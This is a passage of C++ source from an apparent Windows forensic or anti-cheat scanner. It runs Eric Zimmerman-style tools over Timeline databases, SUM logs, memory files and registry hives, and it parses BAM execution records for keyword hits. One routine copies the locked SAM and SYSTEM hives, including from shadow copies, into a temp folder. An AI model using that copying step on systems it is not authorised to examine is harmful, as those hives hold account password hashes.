            hasDotNet9 = (dotnetCheck.find("Microsoft.NETCore.App 9.") != string::npos);
            if (hasDotNet9) {
                Log("  [+] .NET 9 runtime installed successfully via winget.");
            }
            else {
                // winget failed (no internet, policy, etc.) — fall back to manual guidance.
                Log("  [!] Auto-install failed. Please install manually:");
                Log("  [!] Download from: https://aka.ms/dotnet/9/dotnet-runtime-win-x64.exe");
                Log("  [!] Skipping WxTCmd - Windows Timeline data will not be collected.");
                return;
            }
        }
    }

    auto users = EnumUsers();
    if (users.empty()) { Log("  [!] No user profiles found"); return; }

    bool anyRan = false;
    for (auto& user : users) {
        wstring cdpBase = L"C:\\Users\\" + user + L"\\AppData\\Local\\ConnectedDevicesPlatform";
        if (GetFileAttributesW(cdpBase.c_str()) == INVALID_FILE_ATTRIBUTES) continue;

        WIN32_FIND_DATAW fd;
        HANDLE h = FindFirstFileW((cdpBase + L"\\*").c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            wstring dn = fd.cFileName;
            if (dn == L"." || dn == L"..") continue;
            wstring dbPath = cdpBase + L"\\" + dn + L"\\ActivitiesCache.db";
            if (GetFileAttributesW(dbPath.c_str()) == INVALID_FILE_ATTRIBUTES) continue;

            wstring dbDst = TmpDir() + L"ActivitiesCache_" + dn + L".db";
            if (!CopyLockedFile(dbPath, dbDst)) dbDst = dbPath;

            wstring cmd = L"\"" + exe + L"\" -f \"" + dbDst + L"\" --csv \"" + out + L"\"";
            Log("  [cmd] " + WtoS(cmd.c_str()) + " [user: " + WtoS(user.c_str()) + "]");
            // WxTCmd is a .NET 5+ single-file app. The native host stub (WxTCmd.exe)
            // needs to locate the managed assembly (WxTCmd.dll) and the runtime config
            // (WxTCmd.runtimeconfig.json). By default the bundle extractor unpacks
            // embedded files to %LOCALAPPDATA%\.net\WxTCmd\{bundle_hash}\ — a
            // per-machine cache folder that will be EMPTY when HubChecker runs because
            // we extract the companions to %TEMP% instead.
            //
            // Setting DOTNET_BUNDLE_EXTRACT_BASE_DIR to the exe's own directory tells
            // the .NET host to look for (and cache-extract into) that directory, which
            // is exactly where HubChecker already placed WxTCmd.dll and
            // WxTCmd.runtimeconfig.json. This resolves the
            // "The application to execute does not exist: 'WxTCmd.dll'" crash.
            //
            // We also pass exeDir as the CWD (via CaptureInDir) as a belt-and-suspenders
            // measure for any relative-path resolution the host or managed code performs.
            wstring exeDir = exe.substr(0, exe.rfind(L'\\'));
            SetEnvironmentVariableW(L"DOTNET_BUNDLE_EXTRACT_BASE_DIR", exeDir.c_str());
            string o = CaptureInDir(cmd, exeDir);
            // Restore: remove the override so it doesn't bleed into any later process
            // launches that should not be affected by this setting.
            SetEnvironmentVariableW(L"DOTNET_BUNDLE_EXTRACT_BASE_DIR", nullptr);
            if (!o.empty()) Log("  [out] " + o.substr(0, 5000));
            if (dbDst != dbPath) DeleteFileW(dbDst.c_str());
            anyRan = true;
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }
    if (!anyRan) Log("  [!] No ActivitiesCache.db found (Timeline may be disabled)");
}

static void RunSumECmd(const wstring& exe, const wstring& out, const wstring& vss) {
    wstring sumDir = L"C:\\Windows\\System32\\LogFiles\\SUM";
    wstring sumDstDir = TmpDir() + L"HubChk_SUM";
    CreateDirectoryW(sumDstDir.c_str(), nullptr);

    bool anyFile = false;
    WIN32_FIND_DATAW fd;
    HANDLE hFind;

    if (!vss.empty()) {
        Log("  [*] Copying SUM logs from VSS ...");
        // Quietly check if the SUM directory exists in the VSS snapshot before enumerating.
        // This prevents CopyFromVss from emitting [!] VSS open failed errors on client OSes
        // where the SUM feature (Windows Server User Access Logging) is not installed.
        wstring vssSumDir = vss + L"\\Windows\\System32\\LogFiles\\SUM";
        WIN32_FIND_DATAW fdTest;
        HANDLE hTest = FindFirstFileW((vssSumDir + L"\\*").c_str(), &fdTest);
        if (hTest != INVALID_HANDLE_VALUE) {
            FindClose(hTest);
            // Directory exists in VSS — enumerate and copy files
            hFind = FindFirstFileW((vssSumDir + L"\\*").c_str(), &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    wstring relFile = wstring(L"Windows\\System32\\LogFiles\\SUM\\") + fd.cFileName;
                    wstring dstFile = sumDstDir + L"\\" + fd.cFileName;
                    if (CopyFromVss(vss, relFile, dstFile)) anyFile = true;
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
        }
    }
    if (!anyFile) {
        Log("  [*] Copying SUM logs directly ...");
        // Quietly check existence first to avoid noisy error lines on client Windows.
        if (GetFileAttributesW(sumDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
            Log("  [!] SUM database not present on this system (Windows Server feature - not applicable to Windows client)");
            return;
        }
        hFind = FindFirstFileW((sumDir + L"\\*").c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                wstring srcFile = sumDir + L"\\" + fd.cFileName;
                wstring dstFile = sumDstDir + L"\\" + fd.cFileName;
                if (CopyLockedFile(srcFile, dstFile)) anyFile = true;
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
    }
    if (!anyFile) { Log("  [!] Could not copy SUM logs"); return; }

    wstring cmd = L"\"" + exe + L"\" -d \"" + sumDstDir + L"\" --csv \"" + out + L"\"";
    Log("  [cmd] " + WtoS(cmd.c_str()));
    string o = Capture(cmd);
    if (!o.empty()) Log("  [out] " + o.substr(0, 1000));

    WIN32_FIND_DATAW fd2;
    HANDLE hClean = FindFirstFileW((sumDstDir + L"\\*").c_str(), &fd2);
    if (hClean != INVALID_HANDLE_VALUE) {
        do { DeleteFileW((sumDstDir + L"\\" + fd2.cFileName).c_str()); } while (FindNextFileW(hClean, &fd2));
        FindClose(hClean);
    }
    RemoveDirectoryW(sumDstDir.c_str());
}

static void RunBstrings(const wstring& exe, const wstring& outDir) {
    string regexStr;
    for (auto& kw : KW) { if (!regexStr.empty()) regexStr += "|"; regexStr += kw; }
    wstring wregex(regexStr.begin(), regexStr.end());

    struct Target { const wchar_t* path; const wchar_t* label; };
    Target targets[] = {
        { L"C:\\pagefile.sys",  L"pagefile.sys"  },
        { L"C:\\hiberfil.sys",  L"hiberfil.sys"  },
        { L"C:\\swapfile.sys",  L"swapfile.sys"  },
        { nullptr, nullptr }
    };

    int totalHits = 0;
    for (int i = 0; targets[i].path; i++) {
        if (GetFileAttributesW(targets[i].path) == INVALID_FILE_ATTRIBUTES) {
            Log("  [~] Not present (skip): " + WtoS(targets[i].label));
            continue;
        }
        wstring outFile = outDir + L"\\" + targets[i].label + L"_bstrings.txt";
        wstring cmd = L"\"" + exe + L"\" -f \"" + targets[i].path +
            L"\" --lr \"" + wregex + L"\" -i -o \"" + outFile + L"\"";
        Log("  [cmd] " + WtoS(cmd.c_str()));
        RunDetached(cmd, 600000);

        FILE* fp = nullptr; _wfopen_s(&fp, outFile.c_str(), L"rb");
        if (!fp) { Log("  [!] No output for " + WtoS(targets[i].label)); continue; }
        string content; char buf[4096]; size_t n;
        while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) content.append(buf, n);
        fclose(fp);

        std::istringstream ss(content);
        string line; int fileHits = 0;
        while (std::getline(ss, line)) {
            if (!line.empty() && line.back() == '\r') line.pop_back();
            if (line.empty()) continue;
            string lineLow = Lower(line);
            for (auto& kw : KW) {
                if (!MatchesWholeWord(lineLow, kw)) continue;
                fileHits++; totalHits++;
                Log("============================================");
                Log("[HIT] Keyword    : " + kw);
                Log("      Tool       : bstrings.exe");
                Log("      Source     : " + WtoS(targets[i].label));
                Log("      Event Type : String found in raw memory file");
                Log("      Match      : " + line.substr(0, 300));
                Log("============================================");
                break;
            }
        }
        Log("  [~] " + std::to_string(fileHits) + " hit(s) in " + WtoS(targets[i].label));
    }
    Log("  [~] bstrings total: " + std::to_string(totalHits) + " hit(s)");
}

static void RunRECmd(const wstring& exe, const wstring& out, const wstring& vss) {
    wstring exeDir = exe.substr(0, exe.rfind(L'\\'));
    wstring pluginsDir = exeDir + L"\\Plugins";
    bool pluginsExtracted = false;

    if (GetFileAttributesW(pluginsDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        if (g_embeddedPluginCount > 0) {
            CreateDirectoryW(pluginsDir.c_str(), nullptr);
            int extracted = 0;
            for (int m = 0; m < g_embeddedPluginCount; m++) {
                const EmbeddedPlugin& ep = g_embeddedPlugins[m];
                wstring dst = pluginsDir + L"\\" + ep.filename;
                if (GetFileAttributesW(dst.c_str()) == INVALID_FILE_ATTRIBUTES) {
                    HANDLE hf = CreateFileW(dst.c_str(), GENERIC_WRITE, 0,
                        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hf != INVALID_HANDLE_VALUE) {
                        DWORD w = 0;
                        WriteFile(hf, ep.data, (DWORD)ep.size, &w, nullptr);
                        CloseHandle(hf);
                        extracted++;
                    }
                }
            }
            Log("  [+] Extracted " + std::to_string(extracted) + " embedded plugin(s)");
            pluginsExtracted = true;
        }
        else {
            wchar_t selfPath[MAX_PATH]; GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
            wstring selfDir(selfPath); selfDir = selfDir.substr(0, selfDir.rfind(L'\\'));
            vector<wstring> candidates = {
                selfDir + L"\\Plugins",
                selfDir + L"\\RECmd\\Plugins",
                L"C:\\Tools\\RECmd\\Plugins",
                L"C:\\Tools\\Plugins"
            };
            for (auto& cp : candidates) {
                if (GetFileAttributesW(cp.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    Log("  [+] Found Plugins at: " + WtoS(cp.c_str()));
                    CreateDirectoryW(pluginsDir.c_str(), nullptr);
                    WIN32_FIND_DATAW pfd;
                    HANDLE ph = FindFirstFileW((cp + L"\\*").c_str(), &pfd);
                    if (ph != INVALID_HANDLE_VALUE) {
                        do {
                            if (pfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                            CopyFileW((cp + L"\\" + pfd.cFileName).c_str(),
                                (pluginsDir + L"\\" + pfd.cFileName).c_str(), FALSE);
                        } while (FindNextFileW(ph, &pfd));
                        FindClose(ph);
                    }
                    break;
                }
            }
        }
    }
    else {
        Log("  [+] Plugins folder present alongside exe");
    }

    if (GetFileAttributesW(pluginsDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        Log("  [!] RECmd Plugins folder not found - no output will be produced.");
        Log("  [!] Place Plugins\\ folder next to HubChecker.exe and re-run.");
        return;
    }

    wstring batchFile;
    {
        const wchar_t* batchNames[] = {
            L"kroll_batch.reb", L"RECmd_Batch_MC.reb",
            L"RECmd_Batch.reb", L"batch_all.reb", nullptr
        };
        wchar_t selfPath2[MAX_PATH]; GetModuleFileNameW(nullptr, selfPath2, MAX_PATH);
        wstring selfDir2(selfPath2); selfDir2 = selfDir2.substr(0, selfDir2.rfind(L'\\'));

        // Build search list starting from the exe dir then walking up the tree.
        // This handles the common Visual Studio layout where HubChecker.exe sits in
        // x64\Debug\ or x64\Release\ but Plugins\ lives in the project root or a
        // sibling subfolder (e.g. HubChecker\HubChecker\Plugins\).
        // We walk up to 6 parent levels and at each level check both the directory
        // itself and its Plugins\ / RECmd\Plugins\ / HubChecker\Plugins\ subdirs.
        vector<wstring> searchDirs;
        searchDirs.push_back(pluginsDir); // temp Plugins dir (already has extracted .dll plugins)
        {
            wstring cur = selfDir2;
            for (int lvl = 0; lvl < 6; lvl++) {
                searchDirs.push_back(cur);
                searchDirs.push_back(cur + L"\\Plugins");
                searchDirs.push_back(cur + L"\\RECmd\\Plugins");
                searchDirs.push_back(cur + L"\\HubChecker\\Plugins"); // common sub-project layout
                size_t sep = cur.rfind(L'\\');
                if (sep == wstring::npos || sep == 0) break;
                cur = cur.substr(0, sep);
            }
        }
        searchDirs.push_back(L"C:\\Tools\\RECmd\\Plugins");
        searchDirs.push_back(L"C:\\Tools\\RECmd");
        searchDirs.push_back(L"C:\\Tools");
        for (auto& sd : searchDirs) {
            for (int bi = 0; batchNames[bi]; bi++) {
                wstring candidate = sd + L"\\" + batchNames[bi];
                if (GetFileAttributesW(candidate.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    batchFile = candidate;
                    Log("  [+] RECmd batch file: " + WtoS(candidate.c_str()));
                    goto foundBatch;
                }
            }
        }
    foundBatch:;
    }

    auto runOnHive = [&](const wstring& hivePath, const wstring& csvName) {
        wstring cmd;
        if (!batchFile.empty()) {
            cmd = L"\"" + exe + L"\" -f \"" + hivePath + L"\" --csv \"" + out +
                L"\" --csvf " + csvName + L" --bn \"" + batchFile + L"\"";
        }
        else {
            wstring kwRegex;
            for (auto& kw : KW) {
                if (!kwRegex.empty()) kwRegex += L"|";
                kwRegex += wstring(kw.begin(), kw.end());
            }
            Log("  [!] No RECmd batch file found - falling back to keyword --sd search");
            Log("  [!] Place kroll_batch.reb in Plugins\\ for full plugin coverage");
            cmd = L"\"" + exe + L"\" -f \"" + hivePath + L"\" --csv \"" + out +
                L"\" --csvf " + csvName + L" --sd \"(" + kwRegex + L")\"";
        }
        Log("  [cmd] " + WtoS(cmd.c_str()));
        string o = Capture(cmd);
        if (!o.empty()) Log("  [out] " + o.substr(0, 5000));
        // Surface hbin header corruption as a named integrity alert rather than
        // leaving it buried in raw tool output.
        if (o.find("hbin header incorrect") != string::npos ||
            o.find("Extra, non-zero data found beyond hive length") != string::npos) {
            Log("  [!] REGISTRY INTEGRITY WARNING: hive corruption detected in: "
                + WtoS(hivePath.c_str()));
            Log("  [!] RECmd reported an invalid hbin header or data beyond hive boundary.");
            Log("  [!] This can indicate registry tampering, a dirty hive, or evidence manipulation.");
        }
        WIN32_FIND_DATAW rfd;
        HANDLE rh = FindFirstFileW((out + L"\\*.csv").c_str(), &rfd);
        if (rh == INVALID_HANDLE_VALUE)
            Log("  [~] No registry hits for keywords in: " + WtoS(hivePath.c_str()));
        else
            FindClose(rh);
        };

    auto users = EnumUsers();
    for (auto& user : users) {
        wstring src = L"C:\\Users\\" + user + L"\\NTUSER.DAT";
        wstring dst = TmpDir() + L"NTUSER_" + user + L".DAT";
        wstring dstLog1 = dst + L".LOG1";
        wstring dstLog2 = dst + L".LOG2";
        bool ok = false;
        if (!vss.empty()) {
            ok = CopyFromVss(vss, L"Users\\" + user + L"\\NTUSER.DAT", dst);
            if (ok) {
                CopyFromVss(vss, L"Users\\" + user + L"\\NTUSER.DAT.LOG1", dstLog1);
                CopyFromVss(vss, L"Users\\" + user + L"\\NTUSER.DAT.LOG2", dstLog2);
            }
        }
        if (!ok) {
            ok = CopyLockedFile(src, dst);
            if (ok) {
                CopyLockedFile(L"C:\\Users\\" + user + L"\\NTUSER.DAT.LOG1", dstLog1);
                CopyLockedFile(L"C:\\Users\\" + user + L"\\NTUSER.DAT.LOG2", dstLog2);
            }
        }
        if (!ok) { Log("  [!] Could not copy NTUSER.DAT for: " + WtoS(user.c_str())); continue; }
        Log("  [*] Scanning NTUSER.DAT for user: " + WtoS(user.c_str()));
        runOnHive(dst, L"recmd_ntuser_" + user + L".csv");
        DeleteFileW(dst.c_str());
        DeleteFileW(dstLog1.c_str());
        DeleteFileW(dstLog2.c_str());
    }

    {
        wstring dst = TmpDir() + L"SOFTWARE_recmd";
        wstring dstLog1 = dst + L".LOG1";
        wstring dstLog2 = dst + L".LOG2";
        bool ok = false;
        if (!vss.empty()) {
            ok = CopyFromVss(vss, L"Windows\\System32\\config\\SOFTWARE", dst);
            if (ok) {
                CopyFromVss(vss, L"Windows\\System32\\config\\SOFTWARE.LOG1", dstLog1);
                CopyFromVss(vss, L"Windows\\System32\\config\\SOFTWARE.LOG2", dstLog2);
            }
        }
        if (!ok) {
            ok = CopyLockedFile(L"C:\\Windows\\System32\\config\\SOFTWARE", dst);
            if (ok) {
                CopyLockedFile(L"C:\\Windows\\System32\\config\\SOFTWARE.LOG1", dstLog1);
                CopyLockedFile(L"C:\\Windows\\System32\\config\\SOFTWARE.LOG2", dstLog2);
            }
        }
        if (ok) {
            Log("  [*] Scanning SOFTWARE hive ...");
            runOnHive(dst, L"recmd_SOFTWARE.csv");
            DeleteFileW(dst.c_str());
            DeleteFileW(dstLog1.c_str());
            DeleteFileW(dstLog2.c_str());
        }
    }

    {
        wstring dst = TmpDir() + L"SAM_recmd";
        wstring dstLog1 = dst + L".LOG1";
        wstring dstLog2 = dst + L".LOG2";
        bool ok = false;
        if (!vss.empty()) {
            ok = CopyFromVss(vss, L"Windows\\System32\\config\\SAM", dst);
            if (ok) {
                CopyFromVss(vss, L"Windows\\System32\\config\\SAM.LOG1", dstLog1);
                CopyFromVss(vss, L"Windows\\System32\\config\\SAM.LOG2", dstLog2);
            }
        }
        if (!ok) {
            ok = CopyLockedFile(L"C:\\Windows\\System32\\config\\SAM", dst);
            if (ok) {
                CopyLockedFile(L"C:\\Windows\\System32\\config\\SAM.LOG1", dstLog1);
                CopyLockedFile(L"C:\\Windows\\System32\\config\\SAM.LOG2", dstLog2);
            }
        }
        if (ok) {
            Log("  [*] Scanning SAM hive ...");
            runOnHive(dst, L"recmd_SAM.csv");
            DeleteFileW(dst.c_str());
            DeleteFileW(dstLog1.c_str());
            DeleteFileW(dstLog2.c_str());
        }
    }

    {
        wstring dst = TmpDir() + L"SYSTEM_recmd";
        wstring dstLog1 = dst + L".LOG1";
        wstring dstLog2 = dst + L".LOG2";
        bool ok = false;
        if (!vss.empty()) {
            ok = CopyFromVss(vss, L"Windows\\System32\\config\\SYSTEM", dst);
            if (ok) {
                CopyFromVss(vss, L"Windows\\System32\\config\\SYSTEM.LOG1", dstLog1);
                CopyFromVss(vss, L"Windows\\System32\\config\\SYSTEM.LOG2", dstLog2);
            }
        }
        if (!ok) {
            ok = CopyLockedFile(L"C:\\Windows\\System32\\config\\SYSTEM", dst);
            if (ok) {
                CopyLockedFile(L"C:\\Windows\\System32\\config\\SYSTEM.LOG1", dstLog1);
                CopyLockedFile(L"C:\\Windows\\System32\\config\\SYSTEM.LOG2", dstLog2);
            }
        }
        if (ok) {
            Log("  [*] Scanning SYSTEM hive ...");
            runOnHive(dst, L"recmd_SYSTEM.csv");
            DeleteFileW(dst.c_str());
            DeleteFileW(dstLog1.c_str());
            DeleteFileW(dstLog2.c_str());
        }
    }

    if (pluginsExtracted) {
        WIN32_FIND_DATAW pfd;
        HANDLE ph = FindFirstFileW((pluginsDir + L"\\*").c_str(), &pfd);
        if (ph != INVALID_HANDLE_VALUE) {
            do {
                if (!(pfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                    DeleteFileW((pluginsDir + L"\\" + pfd.cFileName).c_str());
            } while (FindNextFileW(ph, &pfd));
            FindClose(ph);
        }
        RemoveDirectoryW(pluginsDir.c_str());
    }
}

// =========================================================================
//  BAM (Background Activity Monitor) Native Scanner
//
//  Only reports entries where the path or filename contains a keyword.
//  Signature and presence are shown as informational context only.
// =========================================================================

static std::map<wstring, wstring> BuildVolumeMap() {
    std::map<wstring, wstring> m;
    wchar_t drives[512] = {};
    if (!GetLogicalDriveStringsW(511, drives)) return m;
    for (wchar_t* p = drives; *p; p += wcslen(p) + 1) {
        wchar_t letter[3] = { p[0], L':', 0 };
        wchar_t target[512] = {};
        if (QueryDosDeviceW(letter, target, 512))
            m[wstring(target)] = wstring(letter);
    }
    return m;
}

static wstring ResolveNtPath(const wstring& ntPath,
    const std::map<wstring, wstring>& volMap)
{
    wstring p = ntPath;
    const wstring grRoot = L"\\\\?\\GLOBALROOT";
    if (p.size() > grRoot.size() && p.substr(0, grRoot.size()) == grRoot)
        p = p.substr(grRoot.size());
    for (auto& kv : volMap) {
        const wstring& dev = kv.first;
        const wstring& drv = kv.second;
        if (p.size() > dev.size() &&
            _wcsnicmp(p.c_str(), dev.c_str(), dev.size()) == 0 &&
            p[dev.size()] == L'\\')
        {
            return drv + p.substr(dev.size());
        }
    }
    return p;
}

// FIX #3 (minor): Accepts both REG_BINARY and REG_QWORD data.
// Both store the FILETIME as 8 little-endian bytes so memcpy is identical.
// The zero-timestamp guard is intentionally kept — the Python snippet omits
// it and would display 1601-01-01 for entries recorded before BAM was active.
static string FiletimeToStr(const BYTE* data, DWORD dataSize) {
    if (dataSize < 8) return "(unknown time)";
    FILETIME ft;
    memcpy(&ft, data, 8);
    // Guard against zero FILETIME — means BAM recorded the exe but has no run timestamp
    if (ft.dwLowDateTime == 0 && ft.dwHighDateTime == 0)
        return "No timestamp (executed before BAM was active)";
    SYSTEMTIME st = {};
    FileTimeToSystemTime(&ft, &st);
    char buf[64];
    snprintf(buf, sizeof(buf), "%04d-%02d-%02d %02d:%02d:%02d (UTC)",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond);
    return buf;
}

// =========================================================================
//  BAM entry collected from any source (live / VSS / ControlSet001)
// =========================================================================
struct BAMRecord {
    string resolvedPath;     // lowercased for dedup/matching
    string resolvedPathOrig;
    string timestamp;
    string sid;
    string username;         // resolved from SID via LookupAccountSidW (empty if not resolvable)
    DWORD  sequenceNumber = 0; // BAM SequenceNumber from the SID subkey (resets on each BAM prune)
    string source;           // e.g. "Live", "Live-CS001", "VSS@2024-11-01", "VSS-CS001@2024-11-01"

    // --- Enhancements: populated in RunBAMScan at report time ---
    bool           inCurrentInstance = false; // ran after current logon?
    vector<string> patternHits;               // lightweight PE cheat pattern matches
};

// =========================================================================
//  EnumAllVssSnapshots - returns all existing VSS DeviceObject paths for C:
//  sorted oldest-first so we mine the deepest history available.
//  If a freshVssDevice is provided it is appended last (newest).
// =========================================================================
static vector<wstring> EnumAllVssSnapshots(const wstring& freshVssDevice = L"") {
    vector<wstring> snaps;
    string raw = Capture(
        L"powershell.exe -NoProfile -NonInteractive -Command \""
        L"Get-WmiObject Win32_ShadowCopy | "
        L"Where-Object { $_.VolumeName -like 'C:*' } | "
        L"Sort-Object InstallDate | "
        L"ForEach-Object { $_.DeviceObject }\"");

    std::set<wstring> seen;
    std::istringstream ss(raw);
    string line;
    while (std::getline(ss, line)) {
        while (!line.empty() && (line.back() == '\r' || line.back() == '\n' || line.back() == ' '))
            line.pop_back();
        if (line.find("GLOBALROOT") == string::npos) continue;
        wstring dev(line.begin(), line.end());
        if (seen.insert(dev).second)
            snaps.push_back(dev);
    }

    if (!freshVssDevice.empty() && seen.find(freshVssDevice) == seen.end())
        snaps.push_back(freshVssDevice);

    Log("  [bam] Found " + std::to_string(snaps.size()) + " VSS snapshot(s) for C:");
    return snaps;
}

// =========================================================================
//  GetVssSnapshotDate
// =========================================================================
static string GetVssSnapshotDate(const wstring& devicePath) {
    // Enumerate all shadow copies as "DeviceObject|YYYY-MM-DD" and match in C++.
    // The original embedded the device path inside PS escaping that was always broken.
    string raw = Capture(
        L"powershell.exe -NoProfile -NonInteractive -Command \""
        L"Get-WmiObject Win32_ShadowCopy | "
        L"ForEach-Object { $_.DeviceObject + '|' + "
        L"($_.ConvertToDateTime($_.InstallDate)).ToString('yyyy-MM-dd') }\"");

    string devPathLow = Lower(WtoS(devicePath.c_str()));
    std::istringstream ss(raw);
    string line;
    while (std::getline(ss, line)) {
        while (!line.empty() &&
            (line.back() == '\r' || line.back() == '\n' || line.back() == ' '))
            line.pop_back();
        size_t pipe = line.find('|');
        if (pipe == string::npos) continue;
        string date = line.substr(pipe + 1);
        if (Lower(line.substr(0, pipe)) == devPathLow && date.size() == 10 && date[4] == '-')
            return date;
    }
    return "unknown-date";
}

// ---------------------------------------------------------------------------
//  SidToUsername - converts a string SID (e.g. "S-1-5-21-...") to a
//  human-readable "DOMAIN\username" string using LookupAccountSidW.
//  Returns empty string if the SID cannot be resolved (e.g. deleted account,
//  offline hive, system SID with no human-readable name).
// ---------------------------------------------------------------------------
static string SidToUsername(const wstring& sidStr) {
    PSID pSid = nullptr;
    if (!ConvertStringSidToSidW(sidStr.c_str(), &pSid)) return "";
    wchar_t name[256] = {}, domain[256] = {};
    DWORD nameLen = 256, domLen = 256;
    SID_NAME_USE use = SidTypeUnknown;
    bool ok = LookupAccountSidW(nullptr, pSid, name, &nameLen, domain, &domLen, &use);
    LocalFree(pSid);
    if (!ok || name[0] == L'\0') return "";
    string n = WtoS(name), d = WtoS(domain);
    return d.empty() ? n : d + "\\" + n;
}

// ---------------------------------------------------------------------------
//  ScanBAMHiveRoot - enumerate all SID subkeys under an open BAM UserSettings
//  key and collect every entry into `out`, keyed by "sid|lowercase_path".
//  Works identically for live HKLM keys and offline RegLoadKey hives.
// ---------------------------------------------------------------------------
static void ScanBAMHiveRoot(HKEY hBamRoot,
    const std::map<wstring, wstring>& volMap,
    const string& sourceLabel,
    std::map<string, BAMRecord>& out)
{
    DWORD sidIdx = 0;
    wchar_t sidName[256];
    DWORD sidNameLen = 256;

    while (RegEnumKeyExW(hBamRoot, sidIdx++, sidName, &sidNameLen,
        nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
    {
        sidNameLen = 256;
        wstring sid = sidName;

        HKEY hSid = nullptr;
        if (RegOpenKeyExW(hBamRoot, sid.c_str(), 0,
            KEY_READ | KEY_WOW64_64KEY, &hSid) != ERROR_SUCCESS)
            continue;

        // Read SequenceNumber for this SID subkey — it is a REG_DWORD that
        // Windows increments each time BAM prunes/resets entries for this user.
        // A value > 1 means entries were wiped at least once since BAM was first
        // active, which is a useful forensic signal when correlating timelines.
        DWORD seqNum = 0;
        {
            DWORD seqData = 0, seqSize = sizeof(seqData), seqType = 0;
            if (RegQueryValueExW(hSid, L"SequenceNumber", nullptr, &seqType,
                reinterpret_cast<LPBYTE>(&seqData), &seqSize) == ERROR_SUCCESS
                && seqType == REG_DWORD)
                seqNum = seqData;
        }

        // Resolve SID string to a human-readable account name once per subkey.
        string username = SidToUsername(sid);
        string sidA = WtoS(sid.c_str());

        DWORD valIdx = 0;
        wchar_t valName[4096];
        // FIX #1: valData was 64 bytes — enough for the 8-byte FILETIME but
        // not for the full BAM value on Win11 22H2+ (up to ~28 bytes today,
        // potentially larger in future builds).  More critically, if the value
        // data exceeded the buffer RegEnumValueW returned ERROR_MORE_DATA and
        // the vrc != ERROR_SUCCESS guard silently skipped the entry entirely,
        // losing it from the output.  We now use a 512-byte stack buffer (well
        // above any known BAM value size) and fall back to a heap allocation if
        // Windows ever returns ERROR_MORE_DATA, so no entry is ever lost.
        BYTE   valDataStack[512];
        DWORD  valNameLen, valDataLen, valType;

        while (true) {
            valNameLen = 4096;
            valDataLen = sizeof(valDataStack);
            valType = 0;

            LONG vrc = RegEnumValueW(hSid, valIdx++,
                valName, &valNameLen,
                nullptr, &valType, valDataStack, &valDataLen);

            if (vrc == ERROR_NO_MORE_ITEMS) break;

            // ERROR_MORE_DATA means the value data was larger than our stack
            // buffer.  Retry with a heap buffer sized to the reported length.
            vector<BYTE> valDataHeap;
            BYTE* valDataPtr = valDataStack;
            if (vrc == ERROR_MORE_DATA) {
                valDataHeap.resize(valDataLen);
                valDataPtr = valDataHeap.data();
                // valNameLen was already filled; reset only the data size
                DWORD retryDataLen = valDataLen;
                DWORD retryNameLen = 4096;
                vrc = RegEnumValueW(hSid, valIdx - 1,
                    valName, &retryNameLen,
                    nullptr, &valType, valDataPtr, &retryDataLen);
                valDataLen = retryDataLen;
            }

            if (vrc != ERROR_SUCCESS) continue;

            wstring ntPath = valName;
            // Skip non-path metadata values (e.g. "SequenceNumber", "Version")
            if (ntPath.empty() || ntPath.find(L'\\') == wstring::npos) continue;

            // Accept REG_BINARY (Win10 pre-20H2) and REG_QWORD (Win10 20H2 / Win11).
            // Both store an identical 8-byte little-endian FILETIME.
            if (valType != REG_BINARY && valType != REG_QWORD) continue;

            wstring resolved = ResolveNtPath(ntPath, volMap);
            string  resolvedA = WtoS(resolved.c_str());
            string  timestamp = FiletimeToStr(valDataPtr, valDataLen);

            // FIX #2: Dedup keeps the record with the OLDEST timestamp rather
            // than the first-seen one.  Passes run Live → CS001 → VSS oldest
            // to newest, so without this fix every VSS snapshot entry for a
            // path that also exists in the live registry was silently dropped.
            // The oldest timestamp is the most forensically valuable for cheat
            // detection (it shows when the file was first executed).
            string dedupeKey = sidA + "|" + Lower(resolvedA);
            auto existing = out.find(dedupeKey);
            if (existing != out.end()) {
                // Keep this record only if its timestamp is older than the
                // one already stored.  "No timestamp" entries sort last.
                const string& existTs = existing->second.timestamp;
                bool existIsNone = existTs.find("No timestamp") != string::npos;
                bool newIsNone = timestamp.find("No timestamp") != string::npos;
                bool keepNew = false;
                if (existIsNone && !newIsNone)
                    keepNew = true;  // replace placeholder with real timestamp
                else if (!newIsNone && !existIsNone && timestamp < existTs)
                    keepNew = true;  // lexicographic compare works on "YYYY-MM-DD HH:MM:SS"
                if (!keepNew) continue;
                // Fall through to overwrite with the older record below
            }

            BAMRecord rec;
            rec.resolvedPath = Lower(resolvedA);
            rec.resolvedPathOrig = resolvedA;
            rec.timestamp = timestamp;
            rec.sid = sidA;
            rec.username = username;
            rec.sequenceNumber = seqNum;
            rec.source = sourceLabel;
            out[dedupeKey] = rec;
        }
        RegCloseKey(hSid);
    }
}

// ---------------------------------------------------------------------------
//  OpenBAMFromHive - loads an offline SYSTEM hive file via RegLoadKey,
//  tries bam\State\UserSettings first (Win10 1709+), falls back to
//  bam\UserSettings (pre-1709), calls ScanBAMHiveRoot, then unloads.
// ---------------------------------------------------------------------------
static void OpenBAMFromHive(const wstring& hiveFile,
    const wchar_t* controlSet,
    const std::map<wstring, wstring>& volMap,
    const string& sourceLabel,
    std::map<string, BAMRecord>& out)
{
    static LONG s_seq = 0;
    LONG mySeq = InterlockedIncrement(&s_seq);
